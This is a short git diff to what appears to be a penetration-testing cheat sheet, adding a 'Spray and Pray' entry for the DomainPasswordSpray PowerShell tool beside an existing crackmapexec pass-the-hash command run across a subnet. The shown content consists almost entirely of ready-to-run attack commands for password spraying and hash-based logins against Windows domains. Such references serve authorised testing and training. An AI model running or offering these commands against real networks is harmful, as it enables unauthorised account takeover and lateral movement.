@@ -79,7 +79,11 @@ Spray and Pray
   ```bash
   sudo crackmapexec smb --local-auth <IP>/<cidr> -u administrator -H <hash> | grep +
   ```
-
+* [DomainPasswordSpray.ps1](https://github.com/dafthack/DomainPasswordSpray) (Spraying from Windows)
+  ```ps1
+  Import-Module .\DomainPasswordSpray.ps1
+  Invoke-DomainPasswordSpray -Password <password> -OutFile <outfile> -ErrorAction SilentlyContinue
+  ```
 
 ## User Hunting
 
